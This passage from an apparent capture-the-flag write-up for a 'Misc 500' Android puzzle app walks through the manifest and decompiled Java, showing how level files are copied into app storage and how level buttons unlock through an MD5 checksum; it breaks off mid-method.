<span class="line"><span></span></span></code></pre>
<h3 id="misc-500">Misc 500</h3>
<p>We were provided with an APK, so the first thing we did was to install it on a phone or emulator, just to try it out.</p>
<img src="https://i.imgur.com/sHpOvTw.png" width="200">
<img src="https://i.imgur.com/Kmhmoik.png" width="200">
<p>We can see that two levels are locked. Let’s play first level.</p>
<img src="https://i.imgur.com/KyH6kyn.png" width="200">
<p>Uh oh, the level seems broken. Let’s open JaDX to find out where the error is.</p>
<p>First, we open <code>AndroidManifest.xml</code> to see where the launcher activity is.</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="xml"><code><span class="line"><span style="color:#666666">&#x3C;</span><span style="color:#4D9375">application</span><span style="color:#666666">></span></span>
<span class="line"><span style="color:#666666">    &#x3C;</span><span style="color:#4D9375">activity</span><span style="color:#BD976A"> android</span><span style="color:#666666">:</span><span style="color:#BD976A">name</span><span style="color:#DBD7CAEE">=</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">com.example.misc500adventure.A</span><span style="color:#C98A7D77">"</span><span style="color:#BD976A"> android</span><span style="color:#666666">:</span><span style="color:#BD976A">exported</span><span style="color:#DBD7CAEE">=</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">false</span><span style="color:#C98A7D77">"</span><span style="color:#666666">/></span></span>
<span class="line"><span style="color:#666666">    &#x3C;</span><span style="color:#4D9375">activity</span><span style="color:#BD976A"> android</span><span style="color:#666666">:</span><span style="color:#BD976A">name</span><span style="color:#DBD7CAEE">=</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">com.example.misc500adventure.C</span><span style="color:#C98A7D77">"</span><span style="color:#BD976A"> android</span><span style="color:#666666">:</span><span style="color:#BD976A">exported</span><span style="color:#DBD7CAEE">=</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">false</span><span style="color:#C98A7D77">"</span><span style="color:#666666">/></span></span>
<span class="line"><span style="color:#666666">    &#x3C;</span><span style="color:#4D9375">activity</span><span style="color:#BD976A"> android</span><span style="color:#666666">:</span><span style="color:#BD976A">name</span><span style="color:#DBD7CAEE">=</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">com.example.misc500adventure.D</span><span style="color:#C98A7D77">"</span><span style="color:#BD976A"> android</span><span style="color:#666666">:</span><span style="color:#BD976A">exported</span><span style="color:#DBD7CAEE">=</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">false</span><span style="color:#C98A7D77">"</span><span style="color:#666666">/></span></span>
<span class="line"><span style="color:#666666">    &#x3C;</span><span style="color:#4D9375">activity</span><span style="color:#BD976A"> android</span><span style="color:#666666">:</span><span style="color:#BD976A">name</span><span style="color:#DBD7CAEE">=</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">com.example.misc500adventure.E</span><span style="color:#C98A7D77">"</span><span style="color:#BD976A"> android</span><span style="color:#666666">:</span><span style="color:#BD976A">exported</span><span style="color:#DBD7CAEE">=</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">false</span><span style="color:#C98A7D77">"</span><span style="color:#666666">/></span></span>
<span class="line"><span style="color:#666666">    &#x3C;</span><span style="color:#4D9375">activity</span><span style="color:#BD976A"> android</span><span style="color:#666666">:</span><span style="color:#BD976A">name</span><span style="color:#DBD7CAEE">=</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">com.example.misc500adventure.F</span><span style="color:#C98A7D77">"</span><span style="color:#BD976A"> android</span><span style="color:#666666">:</span><span style="color:#BD976A">exported</span><span style="color:#DBD7CAEE">=</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">true</span><span style="color:#C98A7D77">"</span><span style="color:#666666">></span></span>
<span class="line"><span style="color:#666666">        &#x3C;</span><span style="color:#4D9375">intent-filter</span><span style="color:#666666">></span></span>
<span class="line"><span style="color:#666666">            &#x3C;</span><span style="color:#4D9375">action</span><span style="color:#BD976A"> android</span><span style="color:#666666">:</span><span style="color:#BD976A">name</span><span style="color:#DBD7CAEE">=</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">android.intent.action.MAIN</span><span style="color:#C98A7D77">"</span><span style="color:#666666">/></span></span>
<span class="line"><span style="color:#666666">            &#x3C;</span><span style="color:#4D9375">category</span><span style="color:#BD976A"> android</span><span style="color:#666666">:</span><span style="color:#BD976A">name</span><span style="color:#DBD7CAEE">=</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">android.intent.category.LAUNCHER</span><span style="color:#C98A7D77">"</span><span style="color:#666666">/></span></span>
<span class="line"><span style="color:#666666">        &#x3C;/</span><span style="color:#4D9375">intent-filter</span><span style="color:#666666">></span></span>
<span class="line"><span style="color:#666666">    &#x3C;/</span><span style="color:#4D9375">activity</span><span style="color:#666666">></span></span>
<span class="line"><span style="color:#666666">&#x3C;/</span><span style="color:#4D9375">application</span><span style="color:#666666">></span></span>
<span class="line"></span></code></pre>
<p>We can see that <code>com.example.misc500adventure.F</code> is the launcher activity. There are two buttons, one opens the level selection screen and the other the about screen.</p>
<p><code>com.example.misc500adventure.D</code></p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="java"><code><span class="line"><span style="color:#CB7676">public</span><span style="color:#CB7676"> final</span><span style="color:#CB7676"> void</span><span style="color:#80A665"> onCreate</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">Bundle bundle</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#C99076">    super</span><span style="color:#666666">.</span><span style="color:#80A665">onCreate</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">bundle</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#80A665">    setContentView</span><span style="color:#666666">(</span><span style="color:#BD976A">R</span><span style="color:#666666">.</span><span style="color:#BD976A">layout</span><span style="color:#666666">.</span><span style="color:#BD976A">activity_b</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#C99076">    this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1859o</span><span style="color:#666666"> =</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">Button</span><span style="color:#666666">)</span><span style="color:#80A665"> findViewById</span><span style="color:#666666">(</span><span style="color:#BD976A">R</span><span style="color:#666666">.</span><span style="color:#BD976A">id</span><span style="color:#666666">.</span><span style="color:#BD976A">button1</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#C99076">    this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1860p</span><span style="color:#666666"> =</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">Button</span><span style="color:#666666">)</span><span style="color:#80A665"> findViewById</span><span style="color:#666666">(</span><span style="color:#BD976A">R</span><span style="color:#666666">.</span><span style="color:#BD976A">id</span><span style="color:#666666">.</span><span style="color:#BD976A">button2</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#C99076">    this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1861q</span><span style="color:#666666"> =</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">Button</span><span style="color:#666666">)</span><span style="color:#80A665"> findViewById</span><span style="color:#666666">(</span><span style="color:#BD976A">R</span><span style="color:#666666">.</span><span style="color:#BD976A">id</span><span style="color:#666666">.</span><span style="color:#BD976A">button3</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#4D9375">    try</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#80A665">        t</span><span style="color:#666666">();</span><span style="color:#758575DD"> // &#x3C;--</span></span>
<span class="line"><span style="color:#666666">    }</span><span style="color:#4D9375"> catch</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">IOException </span><span style="color:#BD976A">e2</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#BD976A">        e2</span><span style="color:#666666">.</span><span style="color:#80A665">printStackTrace</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"><span style="color:#C99076">    this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1859o</span><span style="color:#666666">.</span><span style="color:#80A665">setOnClickListener</span><span style="color:#666666">(</span><span style="color:#C99076">this</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#C99076">    this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1860p</span><span style="color:#666666">.</span><span style="color:#80A665">setOnClickListener</span><span style="color:#666666">(</span><span style="color:#C99076">this</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#C99076">    this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1861q</span><span style="color:#666666">.</span><span style="color:#80A665">setOnClickListener</span><span style="color:#666666">(</span><span style="color:#C99076">this</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#4D9375">    try</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#80A665">        s</span><span style="color:#666666">();</span><span style="color:#758575DD"> // &#x3C;--</span></span>
<span class="line"><span style="color:#666666">    }</span><span style="color:#4D9375"> catch</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">IOException </span><span style="color:#666666">|</span><span style="color:#DBD7CAEE"> NoSuchAlgorithmException </span><span style="color:#BD976A">e3</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#BD976A">        e3</span><span style="color:#666666">.</span><span style="color:#80A665">printStackTrace</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"><span style="color:#666666">}</span></span>
<span class="line"></span></code></pre>
<p><code>t()</code> and <code>s()</code> seem important. Let’s check them.</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="java"><code><span class="line"><span style="color:#CB7676">public</span><span style="color:#CB7676"> final</span><span style="color:#CB7676"> void</span><span style="color:#80A665"> t</span><span style="color:#666666">()</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#DBD7CAEE">    InputStream</span><span style="color:#BD976A"> openRawResource</span><span style="color:#666666"> =</span><span style="color:#80A665"> getResources</span><span style="color:#666666">().</span><span style="color:#80A665">openRawResource</span><span style="color:#666666">(</span><span style="color:#BD976A">R</span><span style="color:#666666">.</span><span style="color:#BD976A">raw</span><span style="color:#666666">.</span><span style="color:#BD976A">level01</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#4D9375">    try</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#DBD7CAEE">        FileOutputStream</span><span style="color:#BD976A"> fileOutputStream</span><span style="color:#666666"> =</span><span style="color:#4D9375"> new</span><span style="color:#80A665"> FileOutputStream</span><span style="color:#666666">(</span><span style="color:#80A665">getDir</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">LevelDir</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">).</span><span style="color:#80A665">getAbsolutePath</span><span style="color:#666666">()</span><span style="color:#CB7676"> +</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">/Level01.jar</span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#CB7676">        byte</span><span style="color:#666666">[]</span><span style="color:#BD976A"> bArr</span><span style="color:#666666"> =</span><span style="color:#4D9375"> new</span><span style="color:#CB7676"> byte</span><span style="color:#666666">[</span><span style="color:#4C9A91">1024</span><span style="color:#666666">];</span></span>
<span class="line"><span style="color:#4D9375">        while</span><span style="color:#666666"> (</span><span style="color:#4D9375">true</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#CB7676">            int</span><span style="color:#BD976A"> read</span><span style="color:#666666"> =</span><span style="color:#BD976A"> openRawResource</span><span style="color:#666666">.</span><span style="color:#80A665">read</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">bArr</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#4D9375">            if</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">read </span><span style="color:#CB7676">&#x3C;=</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">                break</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">            }</span></span>
<span class="line"><span style="color:#BD976A">            fileOutputStream</span><span style="color:#666666">.</span><span style="color:#80A665">write</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">bArr</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> read</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#666666">        }</span></span>
<span class="line"><span style="color:#BD976A">        fileOutputStream</span><span style="color:#666666">.</span><span style="color:#80A665">close</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#BD976A">        openRawResource</span><span style="color:#666666">.</span><span style="color:#80A665">close</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#DBD7CAEE">        openRawResource </span><span style="color:#666666">=</span><span style="color:#80A665"> getResources</span><span style="color:#666666">().</span><span style="color:#80A665">openRawResource</span><span style="color:#666666">(</span><span style="color:#BD976A">R</span><span style="color:#666666">.</span><span style="color:#BD976A">raw</span><span style="color:#666666">.</span><span style="color:#BD976A">liblevel01</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#4D9375">        try</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#DBD7CAEE">            FileOutputStream</span><span style="color:#BD976A"> fileOutputStream2</span><span style="color:#666666"> =</span><span style="color:#4D9375"> new</span><span style="color:#80A665"> FileOutputStream</span><span style="color:#666666">(</span><span style="color:#80A665">getDir</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">LevelSO</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">).</span><span style="color:#80A665">getAbsolutePath</span><span style="color:#666666">()</span><span style="color:#CB7676"> +</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">/liblevel01.so</span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#CB7676">            byte</span><span style="color:#666666">[]</span><span style="color:#BD976A"> bArr2</span><span style="color:#666666"> =</span><span style="color:#4D9375"> new</span><span style="color:#CB7676"> byte</span><span style="color:#666666">[</span><span style="color:#4C9A91">1024</span><span style="color:#666666">];</span></span>
<span class="line"><span style="color:#4D9375">            while</span><span style="color:#666666"> (</span><span style="color:#4D9375">true</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#CB7676">                int</span><span style="color:#BD976A"> read2</span><span style="color:#666666"> =</span><span style="color:#BD976A"> openRawResource</span><span style="color:#666666">.</span><span style="color:#80A665">read</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">bArr2</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#4D9375">                if</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">read2 </span><span style="color:#CB7676">&#x3C;=</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#BD976A">                    fileOutputStream2</span><span style="color:#666666">.</span><span style="color:#80A665">close</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#4D9375">                    return</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">                }</span></span>
<span class="line"><span style="color:#BD976A">                fileOutputStream2</span><span style="color:#666666">.</span><span style="color:#80A665">write</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">bArr2</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> read2</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#666666">            }</span></span>
<span class="line"><span style="color:#666666">        }</span><span style="color:#4D9375"> finally</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#666666">        }</span></span>
<span class="line"><span style="color:#666666">    }</span><span style="color:#4D9375"> finally</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"><span style="color:#666666">}</span></span>
<span class="line"></span></code></pre>
<p>This code simply copies the resources under <code>res/raw/level01.jar</code> to <code>/data/data/com.example.misc500adventure/app_LevelDir/Level01.jar</code> and <code>res/raw/liblevel01.so</code> to <code>/data/data/com.example.misc500adventure/app_LevelSO/liblevel01.so</code>.</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="java"><code><span class="line"><span style="color:#CB7676">public</span><span style="color:#CB7676"> final</span><span style="color:#CB7676"> void</span><span style="color:#80A665"> s</span><span style="color:#666666">()</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#DBD7CAEE">    Button</span><span style="color:#BD976A"> button</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#DBD7CAEE">    String</span><span style="color:#BD976A"> str</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#80A665">    getApplicationContext</span><span style="color:#666666">().</span><span style="color:#80A665">getSharedPreferences</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">LevelCompleted</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#DBD7CAEE">    MessageDigest</span><span style="color:#BD976A"> messageDigest</span><span style="color:#666666"> =</span><span style="color:#BD976A"> MessageDigest</span><span style="color:#666666">.</span><span style="color:#80A665">getInstance</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">MD5</span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#4D9375">    for</span><span style="color:#666666"> (</span><span style="color:#CB7676">int</span><span style="color:#BD976A"> i2</span><span style="color:#666666"> =</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> i2 </span><span style="color:#CB7676">&#x3C;=</span><span style="color:#4C9A91"> 3</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> i2</span><span style="color:#CB7676">++</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#CB7676">        File</span><span style="color:#666666">[]</span><span style="color:#BD976A"> listFiles</span><span style="color:#666666"> =</span><span style="color:#4D9375"> new</span><span style="color:#80A665"> File</span><span style="color:#666666">(</span><span style="color:#80A665">getDir</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">LevelDir</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">).</span><span style="color:#80A665">getAbsolutePath</span><span style="color:#666666">()).</span><span style="color:#80A665">listFiles</span><span style="color:#666666">(</span><span style="color:#4D9375">new</span><span style="color:#80A665"> a</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">i2</span><span style="color:#666666">));</span></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#666666"> (</span><span style="color:#BD976A">listFiles</span><span style="color:#666666">.</span><span style="color:#BD976A">length</span><span style="color:#CB7676"> ></span><span style="color:#4C9A91"> 0</span><span style="color:#CB7676"> &#x26;&#x26;</span><span style="color:#DBD7CAEE"> listFiles</span><span style="color:#666666">[</span><span style="color:#4C9A91">0</span><span style="color:#666666">].</span><span style="color:#80A665">exists</span><span style="color:#666666">())</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">            if</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">i2 </span><span style="color:#CB7676">==</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#C99076">                this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1859o</span><span style="color:#666666">.</span><span style="color:#80A665">setEnabled</span><span style="color:#666666">(</span><span style="color:#4D9375">true</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#DBD7CAEE">                button </span><span style="color:#666666">=</span><span style="color:#C99076"> this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1859o</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#DBD7CAEE">                str </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Play Level 1</span><span style="color:#C98A7D77">"</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">            }</span><span style="color:#4D9375"> else</span><span style="color:#4D9375"> if</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">i2 </span><span style="color:#CB7676">==</span><span style="color:#4C9A91"> 2</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#DBD7CAEE">                FileInputStream</span><span style="color:#BD976A"> fileInputStream</span><span style="color:#666666"> =</span><span style="color:#4D9375"> new</span><span style="color:#80A665"> FileInputStream</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">listFiles</span><span style="color:#666666">[</span><span style="color:#4C9A91">0</span><span style="color:#666666">]);</span></span>
<span class="line"><span style="color:#CB7676">                byte</span><span style="color:#666666">[]</span><span style="color:#BD976A"> bArr</span><span style="color:#666666"> =</span><span style="color:#4D9375"> new</span><span style="color:#CB7676"> byte</span><span style="color:#666666">[</span><span style="color:#4C9A91">1024</span><span style="color:#666666">];</span></span>
<span class="line"><span style="color:#4D9375">                while</span><span style="color:#666666"> (</span><span style="color:#4D9375">true</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#CB7676">                    int</span><span style="color:#BD976A"> read</span><span style="color:#666666"> =</span><span style="color:#BD976A"> fileInputStream</span><span style="color:#666666">.</span><span style="color:#80A665">read</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">bArr</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#4D9375">                    if</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">read </span><span style="color:#CB7676">==</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91">1</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">                        break</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">                    }</span></span>
<span class="line"><span style="color:#BD976A">                    messageDigest</span><span style="color:#666666">.</span><span style="color:#80A665">update</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">bArr</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> read</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#666666">                }</span></span>
<span class="line"><span style="color:#BD976A">                fileInputStream</span><span style="color:#666666">.</span><span style="color:#80A665">close</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#CB7676">                byte</span><span style="color:#666666">[]</span><span style="color:#BD976A"> digest</span><span style="color:#666666"> =</span><span style="color:#BD976A"> messageDigest</span><span style="color:#666666">.</span><span style="color:#80A665">digest</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#DBD7CAEE">                StringBuilder</span><span style="color:#BD976A"> sb</span><span style="color:#666666"> =</span><span style="color:#4D9375"> new</span><span style="color:#80A665"> StringBuilder</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#4D9375">                for</span><span style="color:#666666"> (</span><span style="color:#CB7676">byte</span><span style="color:#BD976A"> b3</span><span style="color:#4D9375"> :</span><span style="color:#DBD7CAEE"> digest</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#BD976A">                    sb</span><span style="color:#666666">.</span><span style="color:#80A665">append</span><span style="color:#666666">(</span><span style="color:#BD976A">Integer</span><span style="color:#666666">.</span><span style="color:#80A665">toString</span><span style="color:#666666">((</span><span style="color:#DBD7CAEE">b3 </span><span style="color:#CB7676">&#x26;</span><span style="color:#4C9A91"> 255</span><span style="color:#666666">)</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 256</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 16</span><span style="color:#666666">).</span><span style="color:#80A665">substring</span><span style="color:#666666">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">));</span></span>
<span class="line"><span style="color:#666666">                }</span></span>
<span class="line"><span style="color:#4D9375">                if</span><span style="color:#666666"> (</span><span style="color:#BD976A">sb</span><span style="color:#666666">.</span><span style="color:#80A665">toString</span><span style="color:#666666">().</span><span style="color:#80A665">equals</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">6b68c21e6979ccb643bb1490584a148e</span><span style="color:#C98A7D77">"</span><span style="color:#666666">))</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#C99076">                    this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1860p</span><span style="color:#666666">.</span><span style="color:#80A665">setEnabled</span><span style="color:#666666">(</span><span style="color:#4D9375">true</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#DBD7CAEE">                    button </span><span style="color:#666666">=</span><span style="color:#C99076"> this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1860p</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#DBD7CAEE">                    str </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Play Level 2</span><span style="color:#C98A7D77">"</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">                }</span><span style="color:#4D9375"> else</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#DBD7CAEE">                    button </span><span style="color:#666666">=</span><span style="color:#C99076"> this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1860p</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#DBD7CAEE">                    str </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Checksum Verification Failed</span><span style="color:#C98A7D77">"</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">                }</span></span>
<span class="line"><span style="color:#666666">            }</span><span style="color:#4D9375"> else</span><span style="color:#4D9375"> if</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">i2 </span><span style="color:#CB7676">==</span><span style="color:#4C9A91"> 3</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#C99076">                this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1861q</span><span style="color:#666666">.</span><span style="color:#80A665">setEnabled</span><span style="color:#666666">(</span><span style="color:#4D9375">true</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#DBD7CAEE">                button </span><span style="color:#666666">=</span><span style="color:#C99076"> this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1861q</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#DBD7CAEE">                str </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Play Level 3</span><span style="color:#C98A7D77">"</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">            }</span></span>
<span class="line"><span style="color:#BD976A">            button</span><span style="color:#666666">.</span><span style="color:#80A665">setText</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">str</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#666666">        }</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"><span style="color:#666666">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">public</span><span style="color:#CB7676"> class</span><span style="color:#5DA994"> a</span><span style="color:#CB7676"> implements</span><span style="color:#80A665"> FilenameFilter</span><span style="color:#666666"> {</span></span>
<span class="line"></span>
<span class="line"><span style="color:#758575DD">    /* renamed from: a  reason: collision with root package name */</span></span>
<span class="line"><span style="color:#CB7676">    public</span><span style="color:#CB7676"> final</span><span style="color:#758575DD"> /* synthetic */</span><span style="color:#CB7676"> int</span><span style="color:#BD976A"> f1862a</span><span style="color:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">    public</span><span style="color:#80A665"> a</span><span style="color:#666666">(</span><span style="color:#CB7676">int</span><span style="color:#BD976A"> i2</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#C99076">        this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1862a</span><span style="color:#666666"> =</span><span style="color:#DBD7CAEE"> i2</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#666666">    @</span><span style="color:#CB7676">Override</span><span style="color:#758575DD"> // java.io.FilenameFilter</span></span>
<span class="line"><span style="color:#CB7676">    public</span><span style="color:#CB7676"> final</span><span style="color:#CB7676"> boolean</span><span style="color:#80A665"> accept</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">File </span><span style="color:#BD976A">file</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> String </span><span style="color:#BD976A">str</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#DBD7CAEE">        StringBuilder</span><span style="color:#BD976A"> g2</span><span style="color:#666666"> =</span><span style="color:#BD976A"> androidx</span><span style="color:#666666">.</span><span style="color:#BD976A">activity</span><span style="color:#666666">.</span><span style="color:#BD976A">result</span><span style="color:#666666">.</span><span style="color:#BD976A">a</span><span style="color:#666666">.</span><span style="color:#80A665">g</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Level0</span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">        g2</span><span style="color:#666666">.</span><span style="color:#80A665">append</span><span style="color:#666666">(</span><span style="color:#C99076">this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1862a</span><span style="color:#666666">);</span></span>
